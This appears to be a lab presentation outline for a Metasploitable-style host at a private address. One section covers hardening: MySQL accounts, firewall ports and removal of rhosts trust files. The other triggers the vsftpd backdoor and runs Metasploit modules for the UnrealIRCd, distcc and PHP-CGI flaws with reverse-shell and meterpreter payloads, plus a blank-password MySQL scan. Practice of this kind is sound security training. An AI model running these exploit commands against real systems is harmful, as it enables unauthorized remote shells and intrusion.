# Presentation

## 1. Weak Account Passwords

mysql:
- `mysql -u root -p`

accounts:
- `select user, host from mysql.user;`

## 2. Firewall

CMD:
- `sudo iptables -L`

ONLY these ports allowed:
- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS)
- 513 (rlogin)
- 3306 (MySQL)

## 3. Removing Trust Relationships

CMD:
- `find / -name ".rhosts"`
- `find / -name "hosts.equiv"`

- `rm /etc/hosts.equiv`
- `rm /root/.rhosts`

Verification:
- `sudo find / -name 'hosts.equiv' -exec cat "{}" \;`

---

## 1. vsftpd Backdoor

- `telnet 172.16.30.60 21`
- `user backdoored:)`
- `pass invalid`
- `quit`
- `telnet 172.16.30.60 6200`

## 2. Samba Backdoor

- `smbclient -L //172.16.30.60`

## 3. IRC Backdoor

- `msfconsole`

- `use exploit/unix/irc/unreal_ircd_3281_backdoor`
- `set payload cmd/unix/reverse`
- `set RHOST 172.16.30.60`
- `set LHOST 172.16.30.75`
- `exploit`

## 4. distcc Exploit

- `msfconsole`

- `use exploit/unix/misc/distcc_exec`
- `set payload cmd/unix/reverse`
- `set RHOST 172.16.30.60`
- `set LHOST 172.16.30.75`
- `exploit`

## 5. MySQL Hardening

- `msfconsole`

- `use auxiliary/scanner/mysql/mysql_login`
- `set BLANK_PASSWORDS true`
- `set RHOSTS 172.16.30.60`
- `set USERNAME root`
- `exploit`

## 6. PHP CGI Exploit

- `msfconsole

- `use exploit/multi/http/php_cgi_arg_injection`
- `set PAYLOAD php/meterpreter/reverse_tcp`
- `set RHOST 172.16.30.60`
- `set LHOST 172.16.30.75`
- `run`
